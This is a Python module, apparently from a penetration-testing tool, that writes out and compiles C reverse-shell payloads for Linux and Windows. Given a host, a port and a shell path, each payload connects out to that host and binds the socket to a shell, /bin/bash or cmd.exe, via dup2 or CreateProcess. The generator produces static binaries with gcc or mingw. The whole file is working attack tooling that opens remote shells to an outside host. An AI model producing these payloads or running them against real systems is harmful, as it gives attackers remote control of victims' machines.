import shutil
import tempfile
import subprocess
import os
import logging

from enum import Enum
from typing import Optional, List

logger = logging.getLogger(__name__)

class CPayloadType(Enum):
    C_POSIX = 0 
    C_WINDOWS = 1

class OperatingSystem(Enum):
    LINUX = 0 
    WINDOWS = 1

def generate_c_payload_binary(
    lhost: str,
    lport: int,
    shell_path: str,
    payload_type: CPayloadType = CPayloadType.C_POSIX,
) -> Optional[bytes]:
    payload_source: Optional[str] = None
    os: Optional[OperatingSystem] = None

    match payload_type:
        case CPayloadType.C_POSIX:
            payload_source = generate_c_posix_source(lhost, lport, shell_path)
            os = OperatingSystem.LINUX
        case CPayloadType.C_WINDOWS:
            payload_source = generate_c_windows_source(lhost, lport, shell_path)
            os = OperatingSystem.WINDOWS
        case _:
            logger.error("unknown C payload type")
            pass

    if (payload_source is None) or (os is None):
        logger.error("failed to generate c payload source")
        return None
        
    payload_binary: Optional[bytes] = compile_source(
        payload_source,
        os,
        static=True,
    )
    if payload_binary is None:
        logger.error("failed to compile c payload")
        return None

    return payload_binary

# TODO: let the user specify a compiler
def compile_source(
    payload_source: str,
    os: OperatingSystem,
    static: bool = True,
) -> Optional[bytes]:
    binary: Optional[bytes] = None

    match os:
        case OperatingSystem.LINUX:
            binary = compile_linux_source(payload_source, static)
        case OperatingSystem.WINDOWS:
            binary = compile_windows_source(payload_source, static)
        case _:
            logger.error("unknown operating system")
            pass
            
    return binary

def compile_linux_source(
    payload_source: str,
    static: bool,
) -> Optional[bytes]:
    return compile_source_implementation(
        payload_source,
        "gcc",
        static,
        [],
    )

def compile_windows_source(
    payload_source: str,
    static: bool,
) -> Optional[bytes]:
    return compile_source_implementation(
        payload_source,
        "x86_64-w64-mingw32-gcc",
        static,
        ["ws2_32"]
    )

def compile_source_implementation(
    payload_source: str,
    compiler: str,
    static: bool,
    libs: List[str],
) -> Optional[bytes]:
    # check for compiler
    gcc_path: Optional[str] = shutil.which(compiler)
    if gcc_path is None:
        logger.error("gcc compiler not found in PATH")
        return None

    # generate temp path
    temp_output_path: str = tempfile.mktemp(suffix='.bin')

    # build compilation args
    argv = [gcc_path, "-o", temp_output_path, "-x", "c", "-"]
    if static:
        argv.append('-static')
    for lib in libs:
        argv.append(f"-l{lib}")

    # compile
    result: subprocess.CompletedProcess = subprocess.run(
        argv,
        input=payload_source,
        text=True
    )
    if result.returncode != 0:
        logger.error(f"failed to compile payload source:\n{result.stderr}")
        return None

    # read payload bytes from tempfile
    with open(temp_output_path, "rb") as temp_output_file:
        payload_binary: bytes = temp_output_file.read()
    os.remove(temp_output_path)

    return payload_binary

def generate_c_payload_source(
    lhost: str,
    lport: int,
    shell_path: str,
    payload_type: CPayloadType = CPayloadType.C_POSIX,
) -> Optional[str]:
    payload_soure: Optional[str] = None
    match payload_type:
        case CPayloadType.C_POSIX:
            payload_soure = generate_c_posix_source(lhost, lport, shell_path)
        case CPayloadType.C_WINDOWS:
            payload_soure = generate_c_windows_source(lhost, lport, shell_path)
        case _:
            logger.error("unknown C payload type")
            pass
            
    return payload_soure

def generate_c_posix_source(
    lhost: str,
    lport: int,
    shell_path: str = "/bin/bash",
) -> str:
    return f"""
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {{
    int port = {lport};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{lhost}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {{"{shell_path}", NULL}};
    execvp("{shell_path}", argv);

    return 0;       
}}
    """

def generate_c_windows_source(
    lhost: str,
    lport: int,
    shell_path: str = "cmd.exe",
) -> str:
    return f"""
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "{lhost}"; 
char port[6] = "{lport}";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("{shell_path}");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}}
    """
